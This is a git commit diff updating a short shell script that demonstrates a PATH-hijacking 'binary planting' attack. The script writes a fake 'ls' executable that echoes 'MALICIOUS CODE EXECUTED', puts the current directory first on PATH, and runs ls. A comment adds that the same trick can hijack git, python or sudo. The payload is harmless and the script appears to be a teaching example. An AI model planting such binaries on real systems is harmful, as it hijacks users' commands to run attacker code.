5a464afabbcad1f9bf72fd8e0b09c44d63240ed7
Akshit <akshitjha999999@gmail.com>
2026-04-28 00:53:51 +0530

    Updated attack_script.sh

--- scripts/attack_script.sh
+++ scripts/attack_script.sh
@@ -1,12 +1,10 @@
 #!/usr/bin/bash
 
 # Called a basic binary planting attack
-
-mkdir -p ./malicious
-
-echo -e '#!/bin/bash\n echo "MALICIOUS CODE EXECUTED"' > ./malicious/ls
-chmod +x ./malicious/ls
+echo -e '#!/bin/bash\n echo "MALICIOUS CODE EXECUTED"' > ./ls
+chmod +x ./ls
 
 export PATH=.:$PATH
-
 ls
+
+# just an example of an attack script, it's dependant on the user running ls, similar scripts can be used to hijack git / python / sudo etc.
